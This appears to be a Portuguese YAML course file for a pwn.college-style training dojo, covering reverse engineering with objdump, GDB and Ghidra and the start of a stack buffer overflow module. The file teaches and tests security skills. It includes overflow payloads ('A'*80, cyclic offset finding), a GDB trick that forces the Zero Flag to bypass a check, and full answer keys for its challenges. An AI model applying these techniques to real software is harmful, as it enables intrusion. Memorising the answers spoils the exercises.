      #### 3. Desmonte em Assembly de Sintaxe Intel (`objdump`)
      Para inspecionar o código de máquina desmontado em sintaxe legível Intel (em vez da notação AT&T com `%` e `$`), utilizamos o `objdump`:
      ```bash
      # Desmontar todas as funções executáveis em sintaxe Intel:
      objdump -d -M intel /tmp/malware_sample.elf

      # Inspecionar especificamente o conteúdo da seção .rodata em hexadecimal e ASCII:
      objdump -s -j .rodata /tmp/malware_sample.elf
      ```

      #### 4. Mapeamento das Seções do Arquivo (`readelf`)
      ```bash
      # Listar todas as seções ELF, endereços de memória virtual e permissões (W/A/X):
      readelf -S /tmp/malware_sample.elf
      ```

      ---

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)

      Siga os passos abaixo para conduzir a análise estática e extrair a chave do binário:

      1. **Inicie o desafio para disponibilizar a amostra:**
         Execute `/challenge/rev-static-strings-objdump`:
         ```bash
         /challenge/rev-static-strings-objdump
         ```
         *O ambiente gerará o binário simulado para análise em `/tmp/malware_sample.elf`.*

      2. **Inspecione a arquitetura do artefato com `file`:**
         Confirme que se trata de um binário ELF de 64 bits:
         ```bash
         file /tmp/malware_sample.elf
         ```

      3. **Extraia as cadeias de texto da seção de dados com `strings`:**
         Execute o utilitário `strings` filtrando palavras-chave de interesse:
         ```bash
         strings -a /tmp/malware_sample.elf | grep REVERSE
         ```
         *Você também pode inspecionar diretamente o dump da seção `.rodata`:*
         ```bash
         objdump -s -j .rodata /tmp/malware_sample.elf
         ```

      4. **Identifique a chave estática:**
         O terminal revelará a constante gravada na seção de dados:
         ```text
         REVERSE_STATIC_KEY_984
         ```

      5. **Submeta a chave ao validador da missão:**
         Envie a chave encontrada como parâmetro de execução do desafio:
         ```bash
         /challenge/rev-static-strings-objdump REVERSE_STATIC_KEY_984
         ```
         *Ou insira-a no prompt interativo se invocado sem argumentos.*

      6. **Capture e registre a flag:**
         O binário homologará o resultado da análise estática e exibirá a flag:
         ```text
         [+] DEBRIEFING TÉCNICO: CHAVE ESTÁTICA LOCALIZADA COM SUCESSO!
         [FLAG DE VALIDAÇÃO CYBERGUARD]:
         pwn.college{...}
         ```
         Copie a flag no formato `pwn.college{...}` e insira no sistema de pontuação.
  - id: rev-gdb-rip-inspection
    name: 'Depuração Dinâmica com GDB: Inspecionando o RIP'
    description: |-
      ### 📖 Introdução Teórica

      A Engenharia Reversa Dinâmica estuda o binário **durante sua execução ativa** em um ambiente controlado e instrumentado por um depurador (*debugger*), como o GDB (*GNU Debugger*). Enquanto a análise estática examina o código gravado no disco, a análise dinâmica permite congelar a execução a cada ciclo de instrução, inspecionar a memória RAM em tempo real e monitorar os registradores internos do processador.

      Para compreender a execução de programas em nível de máquina e avançar para a exploração binária (*pwn*), é obrigatório dominar o ciclo de funcionamento da CPU e a hierarquia de registradores da arquitetura x86_64.

      #### O Ciclo Perpétuo da CPU (Fetch-Decode-Execute)
      Todo processador moderno opera em um ciclo contínuo de três etapas:
      1. **Busca (*Fetch*):** A CPU lê os bytes da instrução contida no endereço de memória apontado pelo registrador **RIP**.
      2. **Decodificação e Incremento (*Decode*):** O processador decodifica o opcode e atualiza automaticamente o RIP para que ele aponte para o início da próxima instrução contígua na memória.
      3. **Execução (*Execute*):** A CPU executa a operação (aritmética, lógica ou cópia). Se a instrução for um desvio (`jmp`, `call`, `ret`), o processador sobrescreve o RIP com o novo endereço de destino.

      ```
             +-------------------------------------------------------+
             |                  CICLO DE EXECUÇÃO DA CPU             |
             +-------------------------------------------------------+
             | 1. FETCH   | Busca instrução no endereço do RIP       |
             | 2. DECODE  | Decodifica e avança RIP = RIP + tamanho  |
             | 3. EXECUTE | Executa. Se salto/call, carrega novo RIP |
             +-------------------------------------------------------+
                                        │
                                        ▼
      +-----------------------------------------------------------------------------------------+
      |                  MAPA DE REGISTRADORES ESSENCIAIS (x86_64 vs 32-bit)                    |
      +-------------------+-------------------+-------------------------------------------------+
      | 64 BITS (x86_64)  | 32 BITS (x86)     | FUNÇÃO REAL NA CPU                              |
      +-------------------+-------------------+-------------------------------------------------+
      | RIP               | EIP               | INSTRUCTION POINTER: Guarda o endereço da       |
      |                   |                   | PRÓXIMA instrução que será executada pela CPU.  |
      +-------------------+-------------------+-------------------------------------------------+
      | RFLAGS            | EFLAGS            | FLAGS DE STATUS: Guarda os resultados de testes |
      |                   |                   | e comparações (Zero Flag ZF, Carry Flag CF).   |
      +-------------------+-------------------+-------------------------------------------------+
      | RSP               | ESP               | STACK POINTER: Aponta para o TOPO da pilha.     |
      +-------------------+-------------------+-------------------------------------------------+
      | RBP               | EBP               | BASE POINTER: Âncora fixa do Stack Frame atual. |
      +-------------------+-------------------+-------------------------------------------------+
      | RAX               | EAX               | ACUMULADOR: Valor de retorno de funções/syscall.|
      +-------------------+-------------------+-------------------------------------------------+
      | RDI, RSI, RDX     | EDI, ESI, EDX     | Passagem dos 3 primeiros argumentos em C (Linux)|
      +-------------------+-------------------+-------------------------------------------------+
      ```

      #### A Distinção Vital: RIP vs. RFLAGS
      Um erro frequente entre analistas iniciantes é confundir o registrador de instrução (**RIP**) com o registrador de flags (**RFLAGS**):
      * **RIP (Instruction Pointer):** É exclusivamente um **ponteiro de endereço de memória de 64 bits** (ex: `0x0000000000401156`). Ele **não guarda resultados lógicos**. Ele é o leme da CPU: quem controla o valor do RIP decide para onde a execução do programa salta!
      * **RFLAGS (Flags Register):** É uma coleção de **bits individuais de status (0 ou 1)** que registram se uma operação anterior resultou em zero (Zero Flag - ZF), em número negativo (Sign Flag - SF) ou em transbordo (Carry/Overflow Flags).

      ---

      ### 💻 Exemplos Práticos e Sintaxe

      O depurador GDB permite inspecionar e manipular o registrador RIP passo a passo:

      #### 1. Iniciando o GDB e Configurando Sintaxe Intel
      ```bash
      # Iniciar o depurador com o executável alvo:
      gdb ./binario

      # Configurar o disassembly para sintaxe Intel (mais limpa que AT&T):
      (gdb) set disassembly-flavor intel
      ```

      #### 2. Comandos Essenciais para Inspeção do RIP
      * `break *main` (ou `b *main`): Define um ponto de parada (*breakpoint*) no endereço inicial da função `main`.
      * `run` (ou `r`): Inicia a execução do programa até interceptar o primeiro breakpoint.
      * `info registers rip` (ou `i r rip`): Imprime o valor numérico armazenado no registrador RIP.
      * `print/x $rip`: Exibe o endereço do RIP em formato hexadecimal puro.
      * `x/i $rip`: Desmonta e exibe a instrução exata que está prestes a ser executada em `$rip`.
      * `x/5i $rip`: Desmonta as próximas 5 instruções na memória a partir do RIP atual.
      * `stepi` (ou `si`): Avança a execução do processador em exatamente **uma única instrução de máquina**.
      * `nexti` (ou `ni`): Avança uma instrução sem entrar dentro de chamadas de função (`call`).

      #### 3. Exemplo Prático de Sessão GDB
      ```text
      (gdb) break *main
      Breakpoint 1 at 0x401126
      (gdb) run
      Breakpoint 1, 0x0000000000401126 in main ()
      (gdb) print/x $rip
      $1 = 0x401126
      (gdb) x/i $rip
      => 0x401126 <main>:    push   rbp
      (gdb) stepi
      0x0000000000401127 in main ()
      (gdb) x/i $rip
      => 0x401127 <main+1>:  mov    rbp, rsp
      (gdb) print/x $rip
      $2 = 0x401127
      ```
      *Note como o valor de `$rip` avançou de `0x401126` para `0x401127` após a execução do opcode de 1 byte `push rbp`.*

      ---

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)

      Siga as instruções abaixo para validar a compreensão conceitual do registrador RIP:

      1. **Invoque o binário do desafio:**
         No terminal, execute o desafio de arquitetura x86_64:
         ```bash
         /challenge/rev-gdb-rip-inspection
         ```

      2. **Revise a aula teórica (Opcional):**
         Caso deseje visualizar a dissecação completa dos registradores da CPU:
         ```bash
         /challenge/rev-gdb-rip-inspection --help
         ```

      3. **Analise a questão apresentada:**
         O desafio exibirá a seguinte pergunta:
         > *"Em processadores de arquitetura x86 e x86_64, qual é a função exata do registrador EIP / RIP?"*
         * 1) Armazenar o resultado de operações lógicas e de comparação (Zero Flag)
         * **2) Armazenar o endereço de memória da PRÓXIMA instrução a ser executada pela CPU**
         * 3) Armazenar o valor retornado pela última chamada de função executada
         * 4) Armazenar o endereço fixo da base do quadro de pilha (Stack Frame)

      4. **Responda com a opção correta:**
         Digite **`2`** no prompt interativo e pressione Enter.
         *Alternativamente, envie diretamente como argumento:*
         ```bash
         /challenge/rev-gdb-rip-inspection 2
         ```

      5. **Capture a flag:**
         O sistema confirmará a consolidação do conceito de ponteiro de instrução e imprimirá a flag:
         ```text
         [+] DEBRIEFING TÉCNICO: CONCEITO DE RIP CONSOLIDADO COM PERFEIÇÃO!
         [FLAG DE VALIDAÇÃO CYBERGUARD]:
         pwn.college{...}
         ```
         Copie a flag no formato `pwn.college{...}` e submeta-a para registrar sua pontuação.
  - id: rev-control-flow-cmp-jmp
    name: Revertendo Desvios Condicionais (CMP, JZ, JNZ)
    description: |-
      ### 📖 Introdução Teórica

      Em operações reais de engenharia reversa — seja para analisar a lógica de validação de um malware, contornar rotinas de licenciamento (*crackmes*) ou auditar controles de integridade — os programas raramente utilizam senhas puras em texto claro. Em vez disso, a lógica de autorização depende de equações aritméticas seguidas por instruções de **controle de fluxo e desvios condicionais** baseados nas flags do processador x86_64.

      #### A Mecânica Interna da Instrução `CMP`
      Na arquitetura x86_64, a instrução assembly:
      ```assembly
      cmp destino, origem
      ```
      executa internamente uma operação aritmética de **subtração**:
      $$\text{Resultado Temporário} = \text{destino} - \text{origem}$$

      **O detalhe crucial de engenharia:**
      * O resultado numérico da subtração **é descartado pela Unidade Lógica e Aritmética (ALU)**. Nem o registrador de destino nem o de origem são alterados!
      * A **única finalidade da instrução `cmp`** é atualizar os bits de condição no registrador de status **`RFLAGS`**.

      #### As Flags de Condição no Registrador `RFLAGS`
      O registrador `RFLAGS` de 64 bits contém bits individuais que informam o comportamento da última operação aritmética executada:

      | Flag | Nome | Bit | Condição em que é Ativada (`1`) |
      | :--- | :--- | :---: | :--- |
      | **`ZF`** | **Zero Flag** | 6 | Quando o resultado da operação foi exatamente **ZERO** ($\text{destino} == \text{origem}$). |
      | **`SF`** | **Sign Flag** | 7 | Quando o resultado foi **negativo** (bit mais significativo é 1). |
      | **`CF`** | **Carry Flag**| 0 | Quando ocorreu transbordo ou empréstimo em aritmética **não assinada** ($\text{destino} < \text{origem}$). |
      | **`OF`** | **Overflow Flag** | 11 | Quando ocorreu estouro de capacidade em aritmética **com sinal**. |

      ```
                            +-------------------+
                            |   cmp eax, 0x12d  |
                            +-------------------+
                                      │
                       Atualiza RFLAGS (ZF, SF, CF, OF)
                                      │
                                      ▼
                            +-------------------+
                            |   jne 0x401250    |
                            +-------------------+
                                      │
                   ┌──────────────────┴──────────────────┐
                   │                                     │
             Se ZF == 0                            Se ZF == 1
         (eax != 301 - Diferente)              (eax == 301 - Igual)
                   │                                     │
                   ▼                                     ▼
           [ SALTA PARA O ERRO ]                 [ CONTINUA PARA A FLAG! ]
      ```

      #### Como os Saltos Condicionais Decidem o Caminho
      As instruções de desvio condicional consultam diretamente os bits do `RFLAGS`:
      * **`je` / `jz` (*Jump if Equal / Jump if Zero*):** Salta se $\text{ZF} == 1$.
      * **`jne` / `jnz` (*Jump if Not Equal / Jump if Not Zero*):** Salta se $\text{ZF} == 0$.
      * **`jg` (*Jump if Greater*):** Salta se $\text{ZF} == 0 \text{ e } \text{SF} == \text{OF}$.
      * **`jl` (*Jump if Less*):** Salta se $\text{SF} \neq \text{OF}$.

      #### Análise Matemática Reversa do Alvo
      O trecho de assembly desmontado da rotina deste desafio implementa o seguinte cálculo:
      1. `imul eax, eax, 0x7`: O valor numérico fornecido pelo usuário é multiplicado por 7.
      2. `cmp eax, 0x12d`: O produto é comparado com o valor hexadecimal `0x12d`.
      3. Conversão de base: $0x12d = (1 \times 256) + (2 \times 16) + 13 = 256 + 32 + 13 = 301$.
      4. Equação reversa:
      $$x \times 7 = 301 \implies x = \frac{301}{7} = 43$$
      5. Quando o input é **`43`**, temos $43 \times 7 = 301$. A subtração interna de `cmp` resulta em $301 - 301 = 0$, forçando $\text{ZF} = 1$. O desvio `jne` (*salte se diferente de zero*) avalia $\text{ZF} = 1$, **não executa o salto para o erro** e permite que o programa prossiga até a rotina de entrega da flag!

      ---

      ### 💻 Exemplos Práticos e Sintaxe

      A dissecação de desvios condicionais e manipulação de flags pode ser realizada via análise algébrica ou através de patching dinâmico de registradores no GDB:

      #### 1. Código Assembly Intel Anotado
      ```assembly
      mov    eax, DWORD PTR [rbp-0x4]   ; Carrega o número fornecido pelo usuário
      imul   eax, eax, 0x7              ; Multiplica eax por 7
      cmp    eax, 0x12d                 ; Compara (eax * 7) com 301 (0x12d)
      jne    0x401250 <rotina_bloqueio> ; Se ZF == 0 (diferente), salta para falha!
      call   0x401180 <sucesso_flag>    ; Se ZF == 1 (igual), LIBERA A FLAG!
      ```

      #### 2. Bypass Dinâmico de Flags no GDB (Técnica de Engenharia Reversa)
      Mesmo sem conhecer o cálculo matemático reverso, um analista com depurador pode forçar a flag no momento exato do teste condicional:
      ```text
      (gdb) break *0x401248             # Breakpoint na instrução jne
      (gdb) run
      (gdb) info registers rflags        # Inspecionar as flags ativas
      (gdb) set $eflags |= (1 << 6)      # Forçar manualmente a Zero Flag (bit 6) para 1!
      (gdb) continue                     # Continuar execução: o programa salta para a flag!
      ```

      #### 3. Cálculo Algébrico Rápido no Terminal
      ```bash
      python3 -c "print(0x12d // 7)"
      ```
      *Retorno:* `43`.

      ---

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)

      Siga os passos abaixo para resolver a equação assembly e obter a flag:

      1. **Inicie o binário do desafio:**
         Execute `/challenge/rev-control-flow-cmp-jmp`:
         ```bash
         /challenge/rev-control-flow-cmp-jmp
         ```

      2. **Analise as instruções de máquina desmontadas:**
         O terminal apresentará o trecho assembly de validação:
         ```text
         imul eax, eax, 0x7    ; multiplica entrada por 7
         cmp  eax, 0x12d       ; compara com 301 em decimal
         jne  <rotina_bloqueio>
         ```

      3. **Calcule o valor reverso:**
         - Converta `0x12d` para decimal: $1 \times 256 + 2 \times 16 + 13 = 301$.
         - Divida 301 pelo fator multiplicador 7: $\frac{301}{7} = 43$.

      4. **Envie o valor calculado:**
         Digite **`43`** no prompt interativo e pressione Enter.
         *Ou execute fornecendo o número diretamente como argumento:*
         ```bash
         /challenge/rev-control-flow-cmp-jmp 43
         ```

      5. **Capture a flag:**
         O binário confirmará que $43 \times 7 = 301$, ativando a Zero Flag ($\text{ZF} = 1$) e liberando a flag:
         ```text
         [+] DEBRIEFING TÉCNICO: DESVIO CONDICIONAL RESOLVIDO COM SUCESSO!
         [FLAG DE VALIDAÇÃO CYBERGUARD]:
         pwn.college{...}
         ```
         Copie a string completa `pwn.college{...}` e submeta-a no painel do dojo.
  - id: rev-ghidra-decompilation
    name: Descompilação Avançada com Ghidra
    description: |-
      ### 📖 Introdução Teórica

      A Engenharia Reversa contemporânea foi profundamente transformada pela disponibilização pública da suíte **Ghidra**, desenvolvida pela Agência de Segurança Nacional dos Estados Unidos (NSA). Enquanto desmontadores tradicionais (*disassemblers* como o `objdump`) apenas traduzem opcodes hexadecimais em mnemônicos crus de assembly x86_64, descompiladores modernos reconstroem a lógica do programa de volta em pseudocódigo na linguagem C de alto nível.

      Para operar com excelência em auditorias de segurança ofensiva e análise de ameaças (Threat Intelligence), o analista deve dominar a mecânica da descompilação e a fronteira entre **Análise Estática** e **Análise Dinâmica**.

      #### Como Opera o Descompilador do Ghidra?
      A descompilação de código de máquina é um processo matemático rigoroso dividido em quatro estágios:
      1. **Desmontagem (Disassembly):** O Ghidra converte os bytes binários do cabeçalho ELF em mnemônicos da arquitetura alvo (x86_64, ARM, MIPS).
      2. **Emissão de P-Code (Linguagem Intermediária):** Cada instrução assembly é traduzida para P-Code, uma representação universal de registradores virtuais que descreve o fluxo de dados independentemente da arquitetura.
      3. **Estrutura SSA (*Static Single Assignment*):** O motor decompilador analisa o tempo de vida e o escopo de cada variável, detectando reutilizações de registradores e recuperando ponteiros de pilha (*stack variables*) e argumentos de função.
      4. **Reconstrução de Controle de Fluxo (CFG):** O algoritmo identifica padrões de ramificação e reconstrói estruturas condicionais limpas (`if/else`, laços `while`/`for` e estruturas `switch`), gerando um código em C surpreendentemente próximo ao código-fonte original escrito pelo desenvolvedor!

      ```
      Código de Máquina (Bytes Hexadecimais)
             │
             ▼
      Assembly x86_64 (Desmontagem / Disassembly)
             │
             ▼
      Linguagem Intermediária (P-Code & Grafo SSA)
             │
             ▼
      Pseudocódigo em C Legível (Descompilação Ghidra)
      ```

      #### Análise Estática vs. Análise Dinâmica: A Distinção Definitiva

      | Critério | Análise Estática (Ghidra / IDA Pro) | Análise Dinâmica (GDB / GEF / Sandboxes) |
      | :--- | :--- | :--- |
      | **Execução do Binário** | **NÃO executa o programa.** O arquivo é tratado como dado inerte. | **EXECUTA ativamente o programa** na CPU e memória. |
      | **Segurança Operacional**| 100% segura contra malwares agressivos (ransomwares, wipers). | Requer isolamento estrito de ambiente (VM com snapshots). |
      | **Abrangência de Código**| Cobre **100% das rotinas e branches**, inclusive código morto. | Cobre apenas as instruções executadas naquela sessão. |
      | **Visão da Memória** | Relativa aos offsets de seções gravadas no disco. | Absoluta, com valores reais e dinâmicos de registradores. |
      | **Mitigações/Desafios** | Dificuldade contra empacotadores (*packers*) e código polimórfico. | Dificuldade contra rotinas de anti-debugging (`ptrace`). |

      ---

      ### 💻 Exemplos Práticos e Sintaxe

      A eficácia do Ghidra reside na conversão de montagens complexas de assembly em código legível para auditoria:

      #### 1. Comparação Visual: Assembly vs Pseudocódigo C Reconstruído
      * **Assembly Puro (Difícil leitura e rastreamento de variáveis):**
        ```assembly
        mov    eax, DWORD PTR [rbp-0x4]
        imul   eax, eax, 0x7
        cmp    eax, 0x12d
        jne    0x401185
        call   0x401050 <print_flag>
        ```
      * **Pseudocódigo Gerado pelo Ghidra (Compreensão imediata):**
        ```c
        undefined8 validate_access(int input_val) {
            if (input_val * 7 == 301) {
                print_flag();
                return 0;
            }
            puts("Acesso Negado!");
            return 1;
        }
        ```

      #### 2. Atalhos e Boas Práticas Operacionais no Ghidra
      * `G` (*Go to Address*): Salta diretamente para um endereço de memória virtual ou símbolo exportado.
      * `L` (*Rename Variable*): Renomeia variáveis opacas geradas pelo descompilador (ex: transformar `local_18` em `buffer_senha`).
      * `T` (*Retype Variable*): Altera o tipo de dado da variável (ex: converter `undefined4` para `int*` ou struct customizada).
      * `X` (*Show References to*): Exibe todas as referências cruzadas (*XREFs*) que chamam ou leem uma determinada função ou string.
      * Janela `Symbol Tree` -> `Functions`: Lista todas as funções identificadas na seção `.text`.

      ---

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)

      Siga os passos abaixo para consolidar os conceitos de descompilação e análise de binários:

      1. **Inicie o executável do desafio:**
         No terminal, execute o binário `/challenge/rev-ghidra-decompilation`:
         ```bash
         /challenge/rev-ghidra-decompilation
         ```

      2. **Consulte a aula didática (Opcional):**
         Caso queira revisar as diretrizes de descompilação da NSA:
         ```bash
         /challenge/rev-ghidra-decompilation --help
         ```

      3. **Avalie a pergunta conceitual:**
         O binário apresentará a seguinte questão:
         > *"Qual é a diferença fundamental entre Análise Estática e Análise Dinâmica?"*
         * 1) A estática executa o binário com múltiplos parâmetros; a dinâmica lê apenas o assembly gravado no disco rígido sem carregar na memória
         * **2) A estática examina o binário e seu pseudocódigo SEM executá-lo; a dinâmica observa e manipula o comportamento durante a execução ativa**
         * 3) A estática é exclusiva para sistemas Windows; a dinâmica é restrita ao Linux
         * 4) Ambas executam o código, diferindo apenas pelo uso ou não de interface gráfica

      4. **Envie a alternativa correta:**
         Digite **`2`** no prompt interativo e pressione Enter.
         *Ou envie diretamente via linha de comando:*
         ```bash
         /challenge/rev-ghidra-decompilation 2
         ```

      5. **Capture a flag de conclusão:**
         O sistema confirmará o fechamento conceitual do Módulo 8 e emitirá a flag:
         ```text
         [+] DEBRIEFING TÉCNICO: DISTINÇÃO ESTÁTICA VS DINÂMICA FIXADA COM SUCESSO!
         [FLAG DE VALIDAÇÃO CYBERGUARD]:
         pwn.college{...}
         ```
         Copie a flag no formato `pwn.college{...}` e insira no sistema de pontuação da plataforma.
- id: exploracao-binaria-pwn
  name: 'Módulo 9: Exploração Binária (Pwn) & Corrupção de Memória'
  description: |
    O ápice técnico da segurança ofensiva de baixo nível. Este módulo une todos os conhecimentos anteriores para demonstrar como falhas clássicas de gerenciamento de memória em C (como o uso negligente de `strcpy`, `gets` e `scanf`) permitem transbordar buffers na pilha (*stack buffer overflow*).

    Você aprenderá a calcular o offset exato de memória, sobrescrever o endereço de retorno salvo, sequestrar o controle do registrador RIP/EIP e executar código arbitrário injetando shellcode personalizado.
  resources:
  - name: Program Security & Binary Exploitation Fundamentals
    type: lecture
    video: https://www.youtube.com/watch?v=cMKeXk3w7v8
    slides: https://pwn.college/program-security
  - name: 'Guia Teórico: Anatomia do Stack Frame, Strcpy Inseguro e Hijacking de RIP'
    type: markdown
    content: |
      ### Por que a Função `strcpy` em C é Notoriamente Insegura?

      A assinatura da função `strcpy` na biblioteca padrão do C é:
      ```c
      char *strcpy(char *dest, const char *src);
      ```
      O perigo fatal reside no fato de que `strcpy` **não realiza nenhuma checagem do tamanho do buffer de destino**. Ela continua copiando bytes ininterruptamente da origem `src` até encontrar um byte nulo terminador (`\0`). Se o buffer de destino tiver 64 bytes e a entrada do usuário fornecer 120 bytes, os 56 bytes excedentes transbordam e corrompem dados adjacentes na pilha de execução!

      ### Anatomia da Pilha (Stack Frame):
      ```
      [ Endereços Maiores de Memória ]
      +------------------------------------+
      | Endereço de Retorno Salvo (Saved RIP)|  <-- ALVO DO ATAQUE!
      +------------------------------------+
      | RBP Salvo (Base Pointer Antigo)    |
      +------------------------------------+
      | Variáveis Locais / Buffer (ex: 64B)|  <-- Início do preenchimento
      +------------------------------------+
      [ Endereços Menores de Memória (RSP) ]
      ```

      #### O Ataque de Buffer Overflow:
      1. O atacante envia uma cadeia de caracteres controlada (ex: padrão cíclico De Bruijn gerado por `cyclic 100`).
      2. O buffer local é preenchido.
      3. O `Saved RBP` é sobrescrito.
      4. O **`Saved RIP`** é sobrescrito pelo endereço de memória desejado pelo atacante.
      5. Quando a função executa a instrução `ret` (Return), a CPU lê o endereço salvo do topo da pilha e o carrega diretamente no registrador `RIP`.
      6. **A execução salta para o código do atacante** (Shellcode ou rotina `win()` que executa `cat /flag`).
  challenges:
  - id: pwn-stack-anatomy-crash
    name: Anatomia do Crash e Medição de Offset na Pilha
    description: |-
      ### 📖 Introdução Teórica

      A Exploração Binária (*Pwn*) representa a fronteira mais técnica e profunda da segurança ofensiva de baixo nível. Para além de ferramentas automatizadas de varredura, a exploração de corrupção de memória exige uma compreensão cirúrgica de como a CPU gerencia a memória física e de como vulnerabilidades em código compilado na linguagem C permitem sequestrar o fluxo de execução de um processo.

      O ponto de partida absoluto da exploração binária é a compreensão da **Pilha de Execução (*Call Stack*)** e do fenômeno de **Transbordamento de Buffer (*Stack Buffer Overflow*)**.

      #### O Paradoxo Geométrico da Pilha de Execução
      Na arquitetura x86_64 sob o padrão System V AMD64 ABI (Linux):
      * **Crescimento da Pilha:** A pilha cresce para **baixo**, em direção aos endereços de memória mais baixos (`0x7fffffffffff -> 0x000000000000`). Cada instrução `push` decrementa o registrador `RSP` (`rsp = rsp - 8`).
      * **Preenchimento de Buffers:** Quando o programa escreve bytes em um array alocado localmente na pilha (usando funções como `gets`, `strcpy`, `scanf` ou `read`), a gravação ocorre sequencialmente para **cima**, em direção aos endereços maiores de memória!

      Essa divergência de direções é a causa física do transbordamento: um array local `char buffer[64]` está fisicamente posicionado em memória logo abaixo de estruturas vitais de controle do programa — especificamente o **`Saved RBP`** e o **`Saved RIP`** (endereço de retorno).

      ```
      [ ENDEREÇOS ALTOS DE MEMÓRIA (0x7fffffffe050) ]
              │
              │  [ DADOS DO CHAMADOR (Caller Stack Frame) ]
              │  +------------------------------------+
              │  | SAVED RIP (Endereço de Retorno - 8B)|  <--- ALVO CRÍTICO DO EXPLOIT!
              │  +------------------------------------+
              │  | SAVED RBP (Base Pointer Anterior)  |  <--- Esmagado pelo transbordo
              │  +------------------------------------+
              │  | char buffer[64] (Espaço alocado)   |  <--- Início da escrita do input
              │  +------------------------------------+       ▲
              │  [ RSP aponta para o topo da pilha ]          │ Gravação avança para CIMA
              ▼                                               │ em direção ao Saved RIP!
      [ ENDEREÇOS BAIXOS DE MEMÓRIA (0x7fffffffdff0) ]
      ```

      #### A Mecânica da Falha de Segmentação (SIGSEGV)
      Quando um programa vulnerável permite que o usuário envie mais bytes do que a capacidade do buffer (ex: 80 bytes para um espaço de 64):
      1. **Bytes 0 a 63:** Preenchem integralmente o array local `buffer[64]`.
      2. **Bytes 64 a 71 (8 bytes):** Transbordam e esmagam o `Saved RBP` na memória.
      3. **Bytes 72 a 79 (8 bytes):** Sobrescrevem o **`Saved RIP`** com os caracteres enviados (ex: `0x4141414141414141`).
      4. **Instrução `ret` (*Return*):** Ao término da função, a CPU executa a instrução `ret` (equivalente a `pop rip`). A CPU retira o valor corrompido do topo da pilha e tenta buscar a próxima instrução nesse endereço.
      5. **Crash do Processo:** A Unidade de Gerenciamento de Memória (MMU) detecta que `0x4141414141414141` é um endereço inválido e o kernel encerra o processo com o sinal `SIGSEGV` (*Segmentation Fault / Signal 11*).

      ---

      ### 💻 Exemplos Práticos e Sintaxe

      Na exploração profissional de binários, nunca se "chuta" o tamanho do payload. Utilizam-se padrões matemáticos não repetíveis (Sequências De Bruijn) para calcular a distância exata até o RIP:

      #### 1. Medição Científica de Offset com Pwntools
      O framework `pwntools` gera padrões cíclicos nos quais qualquer substring de 4 ou 8 bytes é única em toda a extensão:
      ```bash
      # Gerar um padrão cíclico de 100 caracteres:
      python3 -c "from pwn import *; print(cyclic(100).decode())" > payload_teste.txt

      # Executar o binário sob o GDB redirecionando o padrão gerado:
      gdb ./binario
      (gdb) run < payload_teste.txt
      # O programa trava com falha de segmentação:
      # Program received signal SIGSEGV, Segmentation fault.
      # 0x0000000000401156 in vuln ()
      # Topo da pilha corrompido com: 0x6161616a ('jaaa')

      # Calcular o offset exato até o Saved RIP:
      python3 -c "from pwn import *; print(cyclic_find(0x6161616a))"
      # Retorno exato: 72 (64 bytes de buffer + 8 bytes de Saved RBP)
      ```

      #### 2. Disparando Payloads de Teste via Linha de Comando
      ```bash
      # Teste via pipe de entrada padrão (stdin):
      python3 -c "print('A' * 80)" | /challenge/pwn-stack-anatomy-crash

      # Teste passando como argumento de linha de comando:
      /challenge/pwn-stack-anatomy-crash $(python3 -c "print('A'*80)")
      ```

      #### 3. Saída Típica de Transbordo Detectado
      ```text
      [*] Dados recebidos: 80 bytes.
      [!] ALERTA CRÍTICO DE SEGURANÇA: FALHA DE SEGMENTAÇÃO INDUZIDA (SIGSEGV)
      [+] BUFFER OVERFLOW DETECTADO!
          Tamanho do buffer alocado: 64 bytes
          Tamanho da entrada enviada: 80 bytes
          Bytes excedentes na pilha: 16 bytes
      [+] O array transbordou a memória local, esmagou o Saved RBP e atingiu o Saved RIP!
      ```

      ---

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)

      Siga rigorosamente as instruções abaixo para causar o estouro de buffer e obter a flag:

      1. **Inicie o binário do desafio:**
         Execute `/challenge/pwn-stack-anatomy-crash` no terminal:
         ```bash
         /challenge/pwn-stack-anatomy-crash
         ```
         *Observe que o binário relata um buffer estático alocado na pilha de exatamente 64 bytes.*

      2. **Consulte a aula didática integrada (Opcional):**
         Para inspecionar o diagrama completo da pilha e a teoria de buffer overflow:
         ```bash
         /challenge/pwn-stack-anatomy-crash --help
         ```

      3. **Gere um payload de entrada superior a 64 bytes:**
         Utilize o Python para gerar uma cadeia de 80 caracteres (`'A' * 80`), garantindo que 16 bytes excedam a capacidade do buffer e saturem a pilha:
         ```bash
         python3 -c "print('A' * 80)" | /challenge/pwn-stack-anatomy-crash
         ```
         *Ou execute passando via argumento:*
         ```bash
         /challenge/pwn-stack-anatomy-crash $(python3 -c "print('A'*80)")
         ```

      4. **Observe a resposta do simulador:**
         O binário identificará o recebimento de 80 bytes, reportará a corrupção do `Saved RBP` e do `Saved RIP`, simulará a falha de segmentação (SIGSEGV) e emitirá a flag de homologação:
         ```text
         [FLAG DE VALIDAÇÃO CYBERGUARD]:
         pwn.college{...}
         ```

      5. **Submeta a flag:**
         Copie a sequência completa `pwn.college{...}` e insira no painel da plataforma.
  - id: pwn-win-function-redirection
    name: Sequestrando o RIP para a Função Win()
    description: |-
      ### 📖 Introdução Teórica

      Na exploração de software em código binário fechado (Black-Box Testing), analistas ofensivos frequentemente encontram sub-rotinas de depuração, funções administrativas esquecidas por desenvolvedores ou rotinas de teste (comumente chamadas de `win()`, `print_flag()` ou `backdoor()`). Essas funções contêm o código necessário para ler arquivos confidenciais ou abrir privilégios, mas **nunca são invocadas no fluxo normal de execução do programa**.

      A técnica canônica de **Return-to-Win (`ret2win`)** consiste em explorar uma falha de estouro de buffer para sobrescrever cirurgicamente o endereço de retorno salvo na pilha (**`Saved RIP`**), redirecionando o fluxo da CPU diretamente para a função desejada.

      #### Por que a Função `strcpy` é Notoriamente Insegura?
      A biblioteca padrão da linguagem C (`string.h`) possui a função histórica:
      ```c
      char *strcpy(char *dest, const char *src);
      ```
      O algoritmo interno de `strcpy` em assembly opera em um laço cego:
      1. Lê um byte da memória de origem `src`.
      2. Escreve esse byte na memória de destino `dest`.
      3. Compara o byte gravado com o terminador nulo `\0` (ASCII `0x00`).
      4. Se não for nulo, incrementa os ponteiros e repete o laço.

